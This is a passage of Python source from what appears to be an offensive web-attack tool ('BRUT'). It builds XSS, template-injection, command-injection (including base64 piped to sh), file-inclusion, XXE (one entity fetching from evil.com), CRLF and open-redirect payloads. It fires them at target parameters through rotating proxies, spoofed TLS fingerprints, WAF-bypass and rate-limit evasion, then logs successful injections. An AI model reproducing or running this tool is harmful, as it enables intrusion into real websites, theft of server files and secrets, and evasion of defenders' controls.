        elif s == "svg_animate": return f"<svg><animate onbegin={js} attributeName=x dur=1s>", s
        elif s == "math_xlink":
            return f"<math><mtext><table><mglyph><style><!--</style><img title=--&gt;&lt;img src=x onerror={js}&gt;>", s
        elif s == "details_open": return f"<details open ontoggle={js}>", s
        elif s == "iframe_srcdoc":
            return f'<iframe srcdoc="{self._enc_html_entity(f"<script>{js}</script>")}">', s
        elif s == "input_onfocus": return f'<input onfocus={js} autofocus>', s
        elif s == "body_onpageshow": return f'<body onpageshow={js}>', s
        elif s == "marquee_onstart": return f'<marquee onstart={js}>', s
        elif s == "video_source": return f'<video><source onerror={js}>', s
        elif s == "object_data": return f'<object data="javascript:{js}">', s
        elif s == "embed_src": return f'<embed src="javascript:{js}">', s
        elif s == "mutation_xss":
            return f'<noscript><p title="</noscript><img src=x onerror={js}>">', s
        elif s == "dom_xss":
            return f'javascript:eval(document.write(decodeURIComponent(location.hash.slice(1))))', s
        elif s == "polyglot":
            return (f'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk={js} )'
                    f'//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>'
                    f'\\x3csVg/<sVg/oNloAd={js}/>\\x3e'), s
        elif s == "template_injection":
            return f'{{{{constructor.constructor("return this")()}}}}', s
        elif s == "svg_script": return f"<svg><script>{js}</script></svg>", s
        elif s == "math_mtext": return f'<math><mtext><img src=x onerror={js}></mtext></math>', s
        elif s == "noscript_exit": return f'</noscript><img src=x onerror={js}>', s
        elif s == "style_import": return f'<style>@import "javascript:{js}";</style>', s
        elif s == "svg_use":
            return f'<svg><use href="data:image/svg+xml,{self._enc_url(f"<svg onload=\'{js}\'/>")}"/>', s
        elif s == "foreign_object":
            return f'<svg><foreignObject><body xmlns="http://www.w3.org/1999/xhtml"><script>{js}</script></body></foreignObject></svg>', s
        elif s == "animate_values":
            return f'<svg><set attributeName="onmouseover" value="{js}"/>', s
        elif s == "svg_set":
            return f'<svg><animate attributeName="onload" from="0" to="{js}" dur="0.1s"/>', s
        return f"<script>{js}</script>", s

    def _build_ssti(self, tier):
        strats = ["jinja2_basic","jinja2_class_chain","jinja2_config",
                  "twig_basic","twig_filter","freemarker","velocity",
                  "smarty","pebble","thymeleaf","mako","django_tpl",
                  "angular_expression","vue_expression","handlebars",
                  "pug_interpolation","nunjucks","ejs"]
        s = self.rng.choice(strats)
        if s == "jinja2_basic": return f"{{{{{self._pick('ssti_expr')}}}}}", s
        elif s == "jinja2_class_chain": return "{{''.__class__.__mro__[1].__subclasses__()}}", s
        elif s == "jinja2_config":
            return self.rng.choice(["{{config}}","{{config.items()}}","{{self.__dict__}}",
                "{{request.environ}}","{{lipsum.__globals__}}"]), s
        elif s == "twig_basic": return "{{7*7}}", s
        elif s == "twig_filter":
            return "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}", s
        elif s == "freemarker":
            return self.rng.choice(["${7*7}","<#assign x='freemarker.template.utility.Execute'?new()>${x('id')}"]), s
        elif s == "velocity": return "#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))$rt", s
        elif s == "smarty": return self.rng.choice(["{php}echo `id`;{/php}","{system('id')}","{$smarty.version}"]), s
        elif s == "pebble": return "{{7*7}}", s
        elif s == "thymeleaf": return "${7*7}", s
        elif s == "mako": return "${7*7}", s
        elif s == "django_tpl": return self.rng.choice(["{% debug %}","{{settings.SECRET_KEY}}"]), s
        elif s == "angular_expression": return "{{constructor.constructor('return this')()}}", s
        elif s == "vue_expression": return "{{constructor.constructor('alert(1)')()}}", s
        elif s == "handlebars": return "{{#with this}}{{/with}}", s
        elif s == "pug_interpolation": return "#{7*7}", s
        elif s == "nunjucks": return "{{range.constructor('return this')()}}", s
        elif s == "ejs": return "<%= 7*7 %>", s
        return "{{7*7}}", s

    def _build_cmdi(self, tier):
        strats = ["semicolon","pipe","backtick","subshell","newline",
                  "ifs_bypass","variable_bypass","glob_bypass","env_chain",
                  "base64_exec","printf_exec","xargs_exec","find_exec",
                  "while_read","heredoc","process_substitution"]
        s = self.rng.choice(strats)
        cmd = self._pick("cmd_exec"); arg = self._pick("cmd_arg")
        if s == "semicolon": return f";{cmd} {arg}", s
        elif s == "pipe": return f"|{cmd} {arg}", s
        elif s == "backtick": return f"`{cmd} {arg}`", s
        elif s == "subshell": return f"$({cmd} {arg})", s
        elif s == "newline": return f"\\n{cmd} {arg}\\n", s
        elif s == "ifs_bypass": return f";{cmd}$IFS{arg}", s
        elif s == "variable_bypass": return f";a={cmd};$a {arg}", s
        elif s == "glob_bypass": return f";/{cmd[0]}??/{cmd}", s
        elif s == "env_chain": return f";{cmd} {arg} #", s
        elif s == "base64_exec":
            enc = base64.b64encode(f"{cmd} {arg}".encode()).decode()
            return f";echo {enc}|base64 -d|sh", s
        elif s == "printf_exec": return f";$(printf '{cmd}') {arg}", s
        elif s == "xargs_exec": return f";echo {arg}|xargs {cmd}", s
        elif s == "find_exec": return f";find / -name '*' -exec {cmd} \\; 2>/dev/null", s
        elif s == "while_read": return f";echo {arg}|while read x;do {cmd} $x;done", s
        elif s == "heredoc": return f";{cmd} <<'EOF'\\n{arg}\\nEOF", s
        elif s == "process_substitution": return f";{cmd} <({arg})", s
        return f";{cmd} {arg}", s

    def _build_lfi(self, tier):
        strats = ["basic_traversal","null_byte","double_encode","php_filter",
                  "php_input","php_data","expect_wrapper","zip_wrapper",
                  "phar_wrapper","glob_wrapper","proc_wrapper","log_poison",
                  "session_include","mixed_encoding","backslash_traverse","utf8_overlong"]
        s = self.rng.choice(strats)
        trav = self._pick("path_traversal")
        depth = {"short":3,"long":5,"super_long":7,"ultra_long":10}.get(tier,5)
        if s == "basic_traversal": return trav*depth+"etc/passwd", s
        elif s == "null_byte": return trav*depth+"etc/passwd%00", s
        elif s == "double_encode": return self._enc_double_url(trav*depth+"etc/passwd"), s
        elif s == "php_filter": return f"php://filter/convert.base64-encode/resource={trav*depth}etc/passwd", s
        elif s == "php_input": return "php://input", s
        elif s == "php_data": return "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+", s
        elif s == "expect_wrapper": return "expect://id", s
        elif s == "zip_wrapper": return f"zip://{trav*depth}tmp/evil.zip%23shell", s
        elif s == "phar_wrapper": return f"phar://{trav*depth}tmp/evil.phar/shell", s
        elif s == "glob_wrapper": return f"glob://{trav*depth}etc/pass*", s
        elif s == "proc_wrapper": return "/proc/self/environ", s
        elif s == "log_poison": return f"{trav*depth}var/log/apache2/access.log", s
        elif s == "session_include": return f"{trav*depth}tmp/sess_PHPSESSID", s
        elif s == "mixed_encoding": return self._enc_mixed(trav*depth+"etc/passwd"), s
        elif s == "backslash_traverse": return ("\\..")*depth+"\\windows\\system32\\drivers\\etc\\hosts", s
        elif s == "utf8_overlong": return "%c0%ae%c0%ae/"*depth+"etc/passwd", s
        return trav*depth+"etc/passwd", s

    def _build_xxe(self, tier):
        strats = ["classic","parameter_entity","blind_oob","error_based","xinclude"]
        s = self.rng.choice(strats); e = self.rng.choice(["xxe","foo","x","evil"])
        if s == "classic":
            return (f'<?xml version="1.0"?><!DOCTYPE {e} ['
                    f'<!ENTITY {e} SYSTEM "file:///etc/passwd">]>'
                    f'<root>&{e};</root>'), s
        elif s == "parameter_entity":
            return (f'<?xml version="1.0"?><!DOCTYPE {e} ['
                    f'<!ENTITY % {e} SYSTEM "file:///etc/passwd">%{e};]><root/>'), s
        elif s == "blind_oob":
            d = f"{self.rng.randint(1000,9999)}.burp.me"
            return (f'<?xml version="1.0"?><!DOCTYPE {e} ['
                    f'<!ENTITY % {e} SYSTEM "http://{d}/">%{e};]><root/>'), s
        elif s == "error_based":
            return (f'<?xml version="1.0"?><!DOCTYPE {e} ['
                    f'<!ENTITY % {e} SYSTEM "file:///etc/passwd">'
                    f'<!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">%dtd;]>'
                    f'<root>&{e};</root>'), s
        elif s == "xinclude":
            return f'<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd"/></root>', s
        return f'<?xml version="1.0"?><!ENTITY {e} SYSTEM "file:///etc/passwd">', s

    def _build_crlf(self, tier):
        strats = ["basic","encoded","unicode","double_encode","mixed"]
        s = self.rng.choice(strats)
        h = self.rng.choice(["Set-Cookie: brut=1","X-Brut: injected","Location: http://evil.com"])
        if s == "basic": return f"%0d%0a{h}%0d%0a", s
        elif s == "encoded": return f"%0D%0A{self._enc_url(h)}%0D%0A", s
        elif s == "unicode": return f"\\u2028{h}\\u2029", s
        elif s == "double_encode": return self._enc_double_url(f"\\r\\n{h}\\r\\n"), s
        elif s == "mixed": return f"\\\\r\\\\n{h}\\\\r\\\\n", s
        return f"%0d%0a{h}", s

    def _build_redirect(self, tier):
        strats = ["basic","at_sign","double_slash","backslash","data_uri","javascript","encoded","unicode_domain"]
        s = self.rng.choice(strats)
        d = self.rng.choice(["evil.com","brut.test","x.test","attacker.io"])
        if s == "basic": return f"https://{d}", s
        elif s == "at_sign": return f"https://legit.com@{d}", s
        elif s == "double_slash": return f"//{d}", s
        elif s == "backslash": return f"\\\\\\\\{d}", s
        elif s == "data_uri": return f"data:text/html,<script>alert(1)</script>", s
        elif s == "javascript": return f"javascript:alert(1)", s
        elif s == "encoded": return self._enc_url(f"https://{d}"), s
        elif s == "unicode_domain": return f"https://{d.replace('.','．')}", s
        return f"https://{d}", s

    def _build_polyglot(self, tier):
        polyglots = self.polyglot.generate_all_polyglots()
        if polyglots:
            p = random.choice(polyglots)
            return p["payload"], p["strategy"]
        return "'-alert(1)-' OR '1'='1", "fallback"

    def _apply_length_tier(self, payload: str, tier: str) -> str:
        if tier == "short": return payload
        elif tier == "long":
            return f"{self._pick('whitespace')}{payload}/**/"
        elif tier == "super_long":
            return f"/*{'a'*50}*/{self._pick('whitespace')*3}{payload}/*{'a'*50}*/"
        else:
            c = f"/*{'x'*200}*/"
            p = self._pick("whitespace") * 5
            return f"{p}{c}{p}{payload}{p}{c}{p}"

    def generate(self, count: int) -> List[Dict]:
        builders = {
            "sqli": self._build_sqli, "xss": self._build_xss,
            "ssti": self._build_ssti, "cmdi": self._build_cmdi,
            "lfi": self._build_lfi, "xxe": self._build_xxe,
            "crlf": self._build_crlf, "redirect": self._build_redirect,
            "polyglot": self._build_polyglot,
        }
        tiers = ["short","long","super_long","ultra_long"]
        weights = self.learner.get_adaptive_weights()
        payloads = []; seen = set()
        for i in range(count):
            cat = self.rng.choices(self.CATEGORIES, weights=weights, k=1)[0]
            tier = self.rng.choice(tiers)
            raw, strategy = builders[cat](tier)
            raw = self._apply_length_tier(raw, tier)
            mut_count = {"short":0,"long":1,"super_long":2,"ultra_long":3}[tier]
            raw = self._apply_mutations(raw, mut_count)
            is_valid, reason = self.grammar.validate(raw, cat)
            if not is_valid:
                raw = self._apply_mutations(builders[cat](tier)[0], mut_count)
            if self.learner.waf_detected:
                raw, _ = self.waf_bypass.apply_waf_bypass(raw, cat, self.learner.waf_type)
            raw = self.encoder.apply_chain(raw)
            h = hashlib.md5(raw.encode(errors='ignore')).hexdigest()
            if h in seen:
                raw += self._pick("whitespace") + str(self.rng.randint(1,9999))
                h = hashlib.md5(raw.encode(errors='ignore')).hexdigest()
            seen.add(h); self.payload_counter += 1
            payloads.append({
                "id": f"BRUT-{self.payload_counter:06d}",
                "payload": raw, "category": cat,
                "length_tier": tier, "encoding": self.encoder.get_current_chain()[-1] if self.encoder.get_current_chain() else "raw",
                "strategy": strategy, "length": len(raw),
                "hash": h, "built_from_scratch": True,
                "mutations_applied": mut_count,
                "timestamp": datetime.now().isoformat(),
            })
        self.generated_payloads = payloads
        return payloads

    def generate_advanced_batch(self, failed_payloads: List[Dict]) -> List[Dict]:
        if not failed_payloads: return []
        advanced = []
        builders = {
            "sqli": self._build_sqli, "xss": self._build_xss,
            "ssti": self._build_ssti, "cmdi": self._build_cmdi,
            "lfi": self._build_lfi, "polyglot": self._build_polyglot,
        }
        for fp in failed_payloads[:15]:
            cat = fp.get("category", "xss")
            builder = builders.get(cat, self._build_xss)
            for _ in range(5):
                raw, strategy = builder("ultra_long")
                raw = self._apply_mutations(raw, 5)
                raw, _ = self.waf_bypass.apply_waf_bypass(raw, cat, self.learner.waf_type)
                raw = self.encoder.apply_chain(raw)
                is_valid, _ = self.grammar.validate(raw, cat)
                if not is_valid:
                    raw = self._apply_mutations(builder("ultra_long")[0], 3)
                h = hashlib.md5(raw.encode(errors='ignore')).hexdigest()
                self.payload_counter += 1
                advanced.append({
                    "id": f"BRUT-ADV-{self.payload_counter:06d}",
                    "payload": raw, "category": cat,
                    "length_tier": "ultra_long", "encoding": "mixed_advanced",
                    "strategy": strategy, "length": len(raw), "hash": h,
                    "built_from_scratch": True,
                    "evolution_from": fp.get("id", ""),
                    "timestamp": datetime.now().isoformat(),
                })
        return advanced


# ============================================================
# RESPONSE ANALYZER (preserved from v5.0)
# ============================================================
@dataclass
class InjectionResult:
    """Menyimpan metadata lengkap dari satu percobaan injection HTTP."""
    payload_id: str
    payload: str
    category: str
    parameter: str
    url: str
    method: str
    status_code: int
    response_time_ms: float
    response_size: int
    response_type: str
    evidence: str
    response_snippet: str
    success: bool
    anomaly_score: float
    injection_context: str
    generation_id: str
    proxy_used: str
    tls_fingerprint: str
    throttle_delay_ms: float
    retry_count: int
    timestamp: str

    def to_dict(self): return asdict(self)


class ResponseAnalyzer:
    """Mengklasifikasikan respons menjadi output server, HTML biasa, atau blocked."""
    SERVER_ERROR_PATTERNS = [
        r"sql\s*syntax",r"mysql",r"oracle",r"postgresql",r"sqlite",
        r"unclosed\s*quotation",r"syntax\s*error.*?(near|at)",
        r"warning.*?mysql",r"pg_query",r"sqlstate",
        r"odbc.*?driver",r"microsoft.*?odbc",
        r"ora-\d+",r"mysql_fetch",r"mysql_num_rows",
        r"sqlite3\.OperationalError",r"psql",r"jdbc",
        r"System\.Data\.OleDb",r"System\.Data\.SqlClient",
        r"fatal\s*error.*?php",r"parse\s*error",
        r"warning.*?on\s+line\s+\d+",r"notice.*?undefined",
        r"call\s+to\s+undefined\s+function",
        r"uncaught\s+(exception|error)",
        r"traceback.*?(most\s+recent|innermost)",r"django",
        r"werkzeug",r"flask",r"python.*?error",
        r"jinja2.*?exception",r"template.*?error",
        r"java\.lang\.",r"at\s+[a-zA-Z]+\.[a-zA-Z]+$",
        r"exception\s+in\s+thread",r"apache\s*tomcat",
        r"javax\.servlet",r"org\.springframework",
        r"asp\.net",r"\.net\s*framework",r"system\.web",
        r"server\s*error\s*in\s*'[^']+'\s*application",
        r"node\.js",r"express.*?error",r"referenceerror",r"typeerror",
        r"rails",r"activerecord",r"nomethoderror",
        r"failed\s+to\s+open\s+stream",r"open_basedir",
        r"permission\s+denied",r"no\s+such\s+file\s+or\s+directory",
        r"xdebug",r"var_dump",r"print_r",r"debug.*?trace",
        r"stack\s*trace",r"call\s*stack",
    ]
    WAF_BLOCK_PATTERNS = [
        r"blocked\s+by",r"access\s+denied",r"forbidden",
        r"security\s+block",r"request\s+rejected",
        r"suspicious\s+activity",r"malicious\s+request",
        r"incapsula",r"cloudflare",r"akamai",
        r"imperva",r"sucuri",r"mod_security",
        r"your\s*request\s*has\s*been\s*blocked",
        r"firewall",r"protected\s+by",
    ]
    LFI_SUCCESS_PATTERNS = [r"root:[x*]:0:0:",r"daemon:",r"www-data:",r"bin:",r"nobody:"]

    def __init__(self):
        self.server_patterns = [re.compile(p, re.I) for p in self.SERVER_ERROR_PATTERNS]
        self.waf_patterns = [re.compile(p, re.I) for p in self.WAF_BLOCK_PATTERNS]
        self.lfi_patterns = [re.compile(p, re.I) for p in self.LFI_SUCCESS_PATTERNS]

    def analyze(self, response_text, status_code, response_time):
        text = response_text or ""
        snippet = ""; anomaly = 0.0
        for p in self.waf_patterns:
            m = p.search(text)
            if m:
                snippet = self._extract_snippet(text, m.start())
                anomaly = 85.0
                return ("blocked", f"WAF: {m.group(0)[:40]}", False, snippet, anomaly)
        if status_code in [403, 406, 429, 503]:
            anomaly = 70.0 + (status_code - 400)
            return ("blocked", f"Status {status_code}", False, text[:60], anomaly)
        for p in self.lfi_patterns:
            m = p.search(text)
            if m:
                anomaly = 100.0
                return ("server_output", f"LFI: {m.group(0)[:60]}", True, m.group(0)[:60], anomaly)
        for p in self.server_patterns:
            m = p.search(text)
            if m:
                snippet = self._extract_snippet(text, m.start())
                anomaly = 90.0
                return ("server_output", f"Error: {m.group(0)[:80]}", True, snippet, anomaly)
        if response_time > 4500:
            anomaly = 80.0
            return ("server_output", f"Delay: {response_time:.0f}ms", True, f"[Delay {response_time:.0f}ms]", anomaly)
        if re.search(r"(?i)stack\s*trace|call\s*stack|backtrace", text):
            anomaly = 85.0
            return ("server_output", "Stack trace", True, text[:80], anomaly)
        snippet = self._extract_snippet(text, 0)
        anomaly = 10.0
        return ("raw_html", "Normal response", False, snippet[:60], anomaly)

    def _extract_snippet(self, text, pos):
        if not text: return "[empty]"
        clean = re.sub(r'<[^>]+>', ' ', text)
        clean = re.sub(r'\s+', ' ', clean).strip()
        if pos > 0 and pos < len(clean):
            s = max(0, pos-20); e = min(len(clean), pos+60)
            return clean[s:e].strip()
        return clean[:80] if clean else "[empty]"


# ============================================================
# INJECTOR v6.0.1 (Enhanced with Proxy + TLS + Throttle + Retry + httpx fix)
# ============================================================
class Injector:
    """Mengirim payload ke parameter target dan menganalisis responsnya."""
    def __init__(self, target, proxy_manager: ProxyPoolManager = None,
                 tls_engine: TLSFingerprintEngine = None,
                 throttler: AdaptiveThrottler = None,
                 retry_engine: RetryEngine = None):
        self.target = target
        self.proxy_manager = proxy_manager or ProxyPoolManager()
        self.tls_engine = tls_engine or TLSFingerprintEngine()
        self.throttler = throttler or AdaptiveThrottler()
        self.retry_engine = retry_engine or RetryEngine(
            self.throttler, self.proxy_manager, self.tls_engine
        )
        self.analyzer = ResponseAnalyzer()
        self.waf_bypass = WAFBypassEngine()
        self.browser = None
        self.last_proxy_used = None
        self.last_tls_fp = ""
        self.last_throttle_delay = 0.0
        self.last_retry_count = 0
        self.last_elapsed = 0.0
        
    def _init_browser(self):
        if self.browser or not HAS_PLAYWRIGHT: return
        try:
            self._pw = sync_playwright().start()
            self.browser = self._pw.chromium.launch(headless=True)
        except: self.browser = None

    def _close_browser(self):
        if self.browser:
            try: self.browser.close(); self._pw.stop()
            except: pass

    def _make_http_request(self, url: str, method: str = "GET",
                          params: Dict = None, data: Dict = None,
                          proxy_dict: Dict = None,
                          extra_headers: Dict = None) -> Tuple[Optional[str], int, float, int]:

        if self.throttler:
            # v6.2 + v7.0 FIX: Predictive Rate Limiting (sekarang terisi data aktual)
            should_backoff, backoff_sec = self.throttler.predict_rate_limit(
            current_response_time=self.last_elapsed
            )
            if should_backoff:
                print(f"    \033[33m[THROTTLE]\033[0m Predictive backoff: {backoff_sec:.1f}s")
                time.sleep(backoff_sec)

        """
        v6.0.1: Make HTTP request with TLS fingerprint spoofing priority,
        then fallback to httpx (with version-aware proxy arg), then requests.
        """
        headers = get_stealth_headers()
        if extra_headers:
            headers.update(extra_headers)

        # Priority 1: curl_cffi (TLS fingerprint spoofing)
        if HAS_CURL_CFFI:
            result = self.tls_engine.make_request(
                url, method=method, params=params, data=data,
                headers=headers, proxy_dict=proxy_dict
            )
            if result and result[1] > 0:
                self.last_tls_fp = self.tls_engine.get_current_fingerprint()
                return result

        # Priority 2: httpx with HTTP/2 (v6.0.1 — httpx compat fix)
        if HAS_HTTPX:
            start = time.time()
            try:
                proxy_kwargs = _build_httpx_proxy_arg(proxy_dict)
                client = httpx.Client(
                    headers=headers, follow_redirects=True, timeout=20.0,
                    verify=False, http2=HAS_H2,
                    **proxy_kwargs,
                    limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
                )
                if method == "GET":
                    resp = client.get(url, params=params, headers=headers, timeout=20)
                else:
                    resp = client.post(url, data=data, headers=headers, timeout=20)
                elapsed = (time.time() - start) * 1000
                client.close()
                self.last_tls_fp = "httpx"
                return resp.text, resp.status_code, elapsed, len(resp.content)
            except Exception:
                # Fallback: try without proxy
                try:
                    client = httpx.Client(
                        headers=headers, follow_redirects=True, timeout=20.0,
                        verify=False, http2=False,
                        limits=httpx.Limits(max_connections=10, max_keepalive_connections=5),
                    )
                    if method == "GET":
                        resp = client.get(url, params=params, headers=headers, timeout=20)
                    else:
                        resp = client.post(url, data=data, headers=headers, timeout=20)
                    elapsed = (time.time() - start) * 1000
                    client.close()
                    self.last_tls_fp = "httpx-noproxy"
                    return resp.text, resp.status_code, elapsed, len(resp.content)
                except Exception:
                    pass

        # Priority 3: requests (fallback) with tenacity retry
        if HAS_REQUESTS:
            start = time.time()
            
            # v7.0 (Batch 7): Gunakan tenacity untuk retry otomatis pada requests fallback
            if HAS_TENACITY:
                @retry(
                    stop=stop_after_attempt(3),
                    wait=wait_exponential(multiplier=1, min=1, max=10),
                    retry=retry_if_exception_type((requests.exceptions.ConnectionError,
                                                    requests.exceptions.Timeout)),
                    reraise=True
                )
                def _tenacity_request():
                    if method == "GET":
                        return requests.get(url, params=params, headers=headers,
                                           proxies=proxy_dict, timeout=20, verify=False)
                    else:
                        return requests.post(url, data=data, headers=headers,
                                            proxies=proxy_dict, timeout=20, verify=False)
                try:
                    resp = _tenacity_request()
                    elapsed = (time.time() - start) * 1000
                    self.last_tls_fp = "requests+tenacity"
                    return resp.text, resp.status_code, elapsed, len(resp.content)
                except Exception:
                    pass
            else:
                try:
                    if method == "GET":
                        resp = requests.get(url, params=params, headers=headers,
                                           proxies=proxy_dict, timeout=20, verify=False)
                    else:
                        resp = requests.post(url, data=data, headers=headers,
                                            proxies=proxy_dict, timeout=20, verify=False)
                    elapsed = (time.time() - start) * 1000
                    self.last_tls_fp = "requests"
                    return resp.text, resp.status_code, elapsed, len(resp.content)
                except:
                    pass

        return None, 0, 0, 0

    def inject(self, param, payload_dict, use_browser=False):
        payload = payload_dict["payload"]
        gen_id = payload_dict.get("generation_id", "")

        try:
            proxy_info = self.proxy_manager.get_next_proxy()
            proxy_dict = self.proxy_manager.get_proxy_dict(proxy_info)
            self.last_proxy_used = proxy_info

            if use_browser and param.location == "form_input":
                rt, st, rpt, rsz = self._inject_browser(param, payload)
            else:
                def request_func(url, method, params, data, proxy_dict=None, **kwargs):
                    return self._make_http_request(
                        url, method=method, params=params, data=data,
                        proxy_dict=proxy_dict
                    )

                if param.method == "GET":
                    rt, st, rpt, rsz = self.retry_engine.execute_with_retry(
                        request_func,
                        url=param.url,
                        method="GET",
                        params={param.name: payload},
                        data=None,
                        proxy_dict=proxy_dict,
                    )
                else:
                    rt, st, rpt, rsz = self.retry_engine.execute_with_retry(
                        request_func,
                        url=param.url,
                        method="POST",
                        params=None,
                        data={param.name: payload},
                        proxy_dict=proxy_dict,
                    )

            elapsed = rpt if rpt > 0 else 0
            self.last_elapsed = elapsed
            resp_type, evidence, success, snippet, anomaly = self.analyzer.analyze(
                rt or "", st, elapsed
            )

            if st == 429:
                resp_type = "blocked"
                evidence = "429 Too Many Requests (Rate Limited)"

            ctx = InjectionContext.UNKNOWN
            if rt:
                detector = ContextDetector()
                ctx = detector.detect_context(rt, param.name, param.original_value or "1")

            throttle_stats = self.throttler.get_stats()
            self.last_throttle_delay = float(
                throttle_stats.get("current_delay", "0").replace("s", "")
            ) if isinstance(throttle_stats.get("current_delay"), str) else 0

            return InjectionResult(
                payload_id=payload_dict["id"], payload=payload,
                category=payload_dict["category"], parameter=param.name,
                url=param.url, method=param.method, status_code=st,
                response_time_ms=elapsed, response_size=rsz,
                response_type=resp_type, evidence=evidence,
                response_snippet=snippet, success=success,
                anomaly_score=anomaly, injection_context=ctx.value,
                generation_id=gen_id,
                proxy_used=self.last_proxy_used.url[:50] if self.last_proxy_used else "DIRECT",
                tls_fingerprint=self.last_tls_fp,
                throttle_delay_ms=self.last_throttle_delay * 1000,
                retry_count=self.retry_engine.total_retries,
                timestamp=datetime.now().isoformat(),
            )

        except Exception as e:
            return InjectionResult(
                payload_id=payload_dict["id"], payload=payload,
                category=payload_dict["category"], parameter=param.name,
                url=param.url, method=param.method, status_code=0,
                response_time_ms=0, response_size=0,
                response_type="blocked", evidence=f"Error: {str(e)[:80]}",
                response_snippet="[connection failed]", success=False,
                anomaly_score=0, injection_context="unknown",
                generation_id=gen_id,
                proxy_used="ERROR", tls_fingerprint="N/A",
                throttle_delay_ms=0, retry_count=0,
                timestamp=datetime.now().isoformat(),
            )

    def _inject_browser(self, param, payload):
        if not self.browser: self._init_browser()
        if not self.browser: return self._make_http_request(param.url,
            params={param.name: payload} if param.method == "GET" else None,
            data={param.name: payload} if param.method != "GET" else None)
        start = time.time()
        try:
            page = self.browser.new_page()
            page.goto(param.url, timeout=15000)
            time.sleep(1)
            for sel in [f'input[name="{param.name}"]', f'textarea[name="{param.name}"]',
                       f'select[name="{param.name}"]', f'#{param.name}']:
                try:
                    el = page.query_selector(sel)
                    if el: el.fill(payload); break
                except: continue
            try:
                page.click('button[type="submit"], input[type="submit"]')
                page.wait_for_load_state("networkidle", timeout=5000)
            except: pass
            time.sleep(1)
            rt = page.content(); rsz = len(rt)
            rpt = (time.time()-start)*1000
            page.close()
            return rt, 200, rpt, rsz
        except:
            return "", 0, (time.time()-start)*1000, 0

    def close(self): self._close_browser()


# ============================================================
# REPORT SAVER (v6.0 enhanced)
# ============================================================
class ReportSaver:
    """Menyimpan hasil pengujian dalam laporan teks dan JSON."""
    def __init__(self, target, output_dir="./brut_results"):
        self.target = target
        self.parsed = urlparse(target)
        self.domain = self.parsed.netloc or self.parsed.path
        self.domain_clean = re.sub(r'[^a-zA-Z0-9.-]', '_', self.domain)
        self.output_dir = output_dir
        os.makedirs(output_dir, exist_ok=True)

    def save(self, results, payloads, learner=None, schema=None,
             evolver=None, proxy_manager=None, throttler=None, confirmer=None):
        now = datetime.now()
        folder = os.path.join(self.output_dir, f"list-payload-for-{self.domain_clean}-{now.strftime('%Y')}")
        os.makedirs(folder, exist_ok=True)
        base = now.strftime("%m_%d")
        txt_path = os.path.join(folder, f"{base}.txt")
        json_path = os.path.join(folder, f"{base}.json")

        server = [r for r in results if r.response_type == "server_output"]
        raw = [r for r in results if r.response_type == "raw_html"]
        blocked = [r for r in results if r.response_type == "blocked"]

        with open(txt_path, "w", encoding="utf-8") as f:
            f.write(f"{'='*80}\n  BRUT v6.0.1 — Anti-Rate-Limit Genetic ML Report\n")
            f.write(f"  Target: {self.target}\n")
            f.write(f"  Date: {now.strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"  Total: {len(results)} payloads tested\n")
            if learner: f.write(f"  ML: {learner.get_learning_summary()}\n")
            if evolver: f.write(f"  Genetic: {evolver.get_generation_summary()}\n")
            if proxy_manager:
                stats = proxy_manager.get_pool_stats()
                f.write(f"  Proxy: {stats['total']} total, {stats['healthy']} healthy, "
                       f"{stats['blacklisted']} blacklisted\n")
            if throttler:
                stats = throttler.get_stats()
                f.write(f"  Throttle: {stats['total_throttle_time']} total wait, "
                       f"{stats['requests_last_60s']}/60s\n")
            f.write(f"{'='*80}\n\n")

            f.write(f"[✓] SERVER OUTPUT (SUCCESS): {len(server)}\n{'='*80}\n\n")
            for i, r in enumerate(server, 1):
                f.write(f"#{i} | {r.payload_id} | {r.category} | {r.parameter}\n")
                f.write(f"   Status: {r.status_code} ({get_status_meaning(r.status_code)})\n")
                f.write(f"   Time: {r.response_time_ms:.0f}ms | Anomaly: {r.anomaly_score:.1f}\n")
                f.write(f"   Context: {r.injection_context}\n")
                f.write(f"   Proxy: {r.proxy_used} | TLS: {r.tls_fingerprint}\n")
                f.write(f"   Evidence: {r.evidence}\n")
                f.write(f"   Snippet: {r.response_snippet}\n")
                f.write(f"   Payload: {r.payload[:300]}\n\n")

            f.write(f"\n[~] RAW HTML: {len(raw)}\n{'='*80}\n\n")
            for i, r in enumerate(raw, 1):
                f.write(f"#{i} | {r.payload_id} | {r.category} | {r.parameter} | {r.payload[:200]}\n")

            f.write(f"\n[✗] BLOCKED: {len(blocked)}\n{'='*80}\n\n")
            for i, r in enumerate(blocked, 1):
                f.write(f"#{i} | {r.payload_id} | {r.category} | {r.parameter} | "
                       f"Status: {r.status_code} | Proxy: {r.proxy_used[:30]} | {r.evidence}\n")

            if schema:
                f.write(f"\n\n{'='*80}\n  EVOLUTION LOG\n{'='*80}\n\n")
                evo_log = schema.get_evolution_log()
                for entry in evo_log[-50:]:
                    f.write(f"  Gen {entry['gen_num']} | {entry['gen_id']} | "
                           f"{entry['category']} | fit={entry['fitness']:.3f} | "
                           f"alive={entry['alive']} | muts={entry['mutations']}\n")

                if schema.rate_limit_events:
                    f.write(f"\n  RATE LIMIT EVENTS ({len(schema.rate_limit_events)}):\n")
                    for evt in schema.rate_limit_events[-20:]:
                        f.write(f"    {evt['timestamp']} | proxy={evt['proxy'][:30]} | "
                               f"delay={evt['throttle_delay']:.1f}s\n")
            
            if confirmer and hasattr(confirmer, 'confirmed_vulnerabilities') and confirmer.confirmed_vulnerabilities:
                f.write(f"\n\n{'='*80}\n  CONFIRMED VULNERABILITIES\n{'='*80}\n\n")
                for v in confirmer.confirmed_vulnerabilities:
                    f.write(f"  - Parameter: {v['parameter']} | Category: {v['category']} | Time diff: {v['time_diff']:.2f}s\n")
                    f.write(f"    Original: {v['original_payload']}\n")
                    f.write(f"    Verification: {v['verification_payload']}\n")              

        with open(json_path, "w", encoding="utf-8") as f:
            json.dump({
                "meta": {
                    "target": self.target,
                    "domain": self.domain,
                    "timestamp": now.isoformat(),
                    "total": len(results),
                    "success": len(server),
                    "raw_html": len(raw),
                    "blocked": len(blocked),
                    "ml": learner.get_learning_summary() if learner else "",
